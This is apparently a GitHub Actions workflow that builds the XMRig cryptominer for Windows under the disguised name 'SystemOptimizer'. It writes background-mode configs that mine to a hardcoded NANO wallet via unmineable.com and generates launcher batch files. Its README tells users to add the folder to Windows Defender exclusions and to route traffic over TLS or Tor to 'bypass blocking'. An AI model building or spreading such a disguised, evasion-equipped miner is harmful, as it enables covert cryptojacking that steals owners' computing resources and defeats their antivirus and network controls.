name: Build Custom XMRig for Windows

on:
  push:
    branches: [ master, main ]
  pull_request:
    branches: [ master, main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-2022
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
      with:
        arch: x64
    
    - name: Setup vcpkg
      run: |
        cd C:\vcpkg
        git pull
        .\bootstrap-vcpkg.bat -disableMetrics
        .\vcpkg integrate install
      shell: cmd
        
    - name: Install dependencies
      run: |
        cd C:\vcpkg
        .\vcpkg install libuv:x64-windows-static openssl:x64-windows-static
      shell: cmd
      
    - name: Customize project name
      run: |
        (Get-Content CMakeLists.txt) -replace 'project\(xmrig\)', 'project(SystemOptimizer)' | Set-Content CMakeLists.txt
      shell: pwsh
      
    - name: Configure CMake
      run: |
        mkdir build
        cd build
        cmake .. -G "Visual Studio 17 2022" -A x64 ^
          -DCMAKE_BUILD_TYPE=Release ^
          -DCMAKE_TOOLCHAIN_FILE=C:/vcpkg/scripts/buildsystems/vcpkg.cmake ^
          -DVCPKG_TARGET_TRIPLET=x64-windows-static ^
          -DWITH_HWLOC=OFF ^
          -DWITH_HTTP=ON ^
          -DWITH_TLS=ON ^
          -DBUILD_STATIC=ON
      shell: cmd
      
    - name: Build
      run: |
        cd build
        cmake --build . --config Release --parallel
      shell: cmd
      
    - name: Prepare artifacts
      run: |
        New-Item -ItemType Directory -Force -Path "output"
        Copy-Item "build\Release\SystemOptimizer.exe" "output\"
        
        Write-Host "Creating configuration files..."
        
        $configTor = @{
            autosave = $true
            background = $true
            colors = $false
            title = $false
            randomx = @{
                init = -1
                mode = "auto"
                "1gb-pages" = $false
                numa = $true
            }
            cpu = @{
                enabled = $true
                "huge-pages" = $true
                priority = 1
                "max-threads-hint" = 75
                asm = $true
            }
            "log-file" = "optimizer.log"
            pools = @(
                @{
                    url = "rx.unmineable.com:3333"
                    user = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
                    pass = "x"
                    keepalive = $true
                    tls = $false
                    socks5 = "127.0.0.1:9050"
                }
            )
            "print-time" = 60
            retries = 5
            "retry-pause" = 5
        }
        $configTor | ConvertTo-Json -Depth 10 | Out-File "output\config-tor.json" -Encoding UTF8
        
        $configTLS = @{
            autosave = $true
            background = $true
            colors = $false
            title = $false
            randomx = @{
                init = -1
                mode = "auto"
                "1gb-pages" = $false
                numa = $true
            }
            cpu = @{
                enabled = $true
                "huge-pages" = $true
                priority = 1
                "max-threads-hint" = 75
                asm = $true
            }
            "log-file" = "optimizer.log"
            pools = @(
                @{
                    url = "rx.unmineable.com:443"
                    user = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
                    pass = "x"
                    keepalive = $true
                    tls = $true
                }
            )
            "print-time" = 60
            retries = 5
            "retry-pause" = 5
        }
        $configTLS | ConvertTo-Json -Depth 10 | Out-File "output\config-tls.json" -Encoding UTF8
        
        $configTest = @{
            autosave = $false
            background = $false
            colors = $true
            title = $true
            randomx = @{
                init = -1
                mode = "auto"
            }
            cpu = @{
                enabled = $true
                "huge-pages" = $true
                "max-threads-hint" = 75
            }
            pools = @(
                @{
                    url = "rx.unmineable.com:3333"
                    user = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
                    pass = "x"
                    keepalive = $true
                }
            )
            "print-time" = 60
        }
        $configTest | ConvertTo-Json -Depth 10 | Out-File "output\config-test.json" -Encoding UTF8
        
        Write-Host "Creating batch files..."
        
        "@echo off`r`necho Starting with Tor proxy...`r`necho Make sure tor.exe is running!`r`necho.`r`nSystemOptimizer.exe -c config-tor.json -B" | Out-File "output\START-TOR.bat" -Encoding ASCII
        
        "@echo off`r`necho Starting with TLS...`r`necho.`r`nSystemOptimizer.exe -c config-tls.json -B" | Out-File "output\START-TLS.bat" -Encoding ASCII
        
        "@echo off`r`necho Test Mode - Press Ctrl+C to stop`r`necho.`r`npause`r`nSystemOptimizer.exe -c config-test.json" | Out-File "output\START-TEST.bat" -Encoding ASCII
        
        "@echo off`r`necho Stopping SystemOptimizer...`r`ntaskkill /F /IM SystemOptimizer.exe 2>nul`r`nif errorlevel 1 (echo Not running) else (echo Stopped)`r`npause" | Out-File "output\STOP.bat" -Encoding ASCII
        
        Write-Host "Creating README..."
        
        $lines = @(
          "============================================================",
          "    NANO MINER - CUSTOM BUILD FROM SOURCE",
          "============================================================",
          "",
          "Wallet:   nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp",
          "Worker:   d3ibis_pc",
          "Referral: c5g6-wmzx (0.25% bonus)",
          "Pool:     rx.unmineable.com",
          "",
          "============================================================",
          "STEP 1 - ADD TO WINDOWS DEFENDER EXCLUSIONS",
          "============================================================",
          "",
          "REQUIRED! Windows will delete the file without this.",
          "",
          "1. Windows Security > Virus & threat protection",
          "2. Manage settings > Exclusions",
          "3. Add this folder",
          "",
          "============================================================",
          "STEP 2 - TEST CONNECTION",
          "============================================================",
          "",
          "Double-click: START-TEST.bat",
          "",
          "If you see 'accepted' shares, you're mining!",
          "If blocked, proceed to Step 3.",
          "",
          "============================================================",
          "STEP 3 - BYPASS BLOCKING",
          "============================================================",
          "",
          "METHOD A - TLS (Try this first):",
          "  Double-click: START-TLS.bat",
          "",
          "METHOD B - Tor (Most reliable):",
          "  1. Download: https://www.torproject.org/download/tor/",
          "  2. Run tor.exe",
          "  3. Double-click: START-TOR.bat",
          "",
          "============================================================",
          "FILES",
          "============================================================",
          "",
          "SystemOptimizer.exe - Custom built miner",
          "config-tor.json     - With Tor proxy",
          "config-tls.json     - With TLS encryption",
          "config-test.json    - For testing",
          "START-TOR.bat       - Run with Tor",
          "START-TLS.bat       - Run with TLS",
          "START-TEST.bat      - Test mode",
          "STOP.bat            - Stop miner",
          "",
          "============================================================",
          "MONITOR",
          "============================================================",
          "",
          "Stats: https://unmineable.com/ (enter your wallet)",
          "Log:   optimizer.log (look for 'accepted' messages)",
          "",
          "============================================================",
          "TROUBLESHOOTING",
          "============================================================",
          "",
          "Q: File deleted",
          "A: Add folder to Windows Defender exclusions",
          "",
          "Q: Connection refused",
          "A: Try START-TLS.bat, then START-TOR.bat",
          "",
          "Q: Low hashrate",
          "A: Run as Administrator, close other programs",
          "",
          "============================================================",
          "",
          "Build: $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')",
          "Source: https://github.com/d3ibis/XMRig",
          "",
          "============================================================"
        )
        
        $lines -join "`r`n" | Out-File "output\README.txt" -Encoding UTF8
        
        Write-Host "Done! All files prepared successfully"
      shell: pwsh
      
    - name: Upload artifacts
      uses: actions/upload-artifact@v4
      with:
        name: SystemOptimizer-Nano-Custom-Build
        path: output/
        retention-days: 90
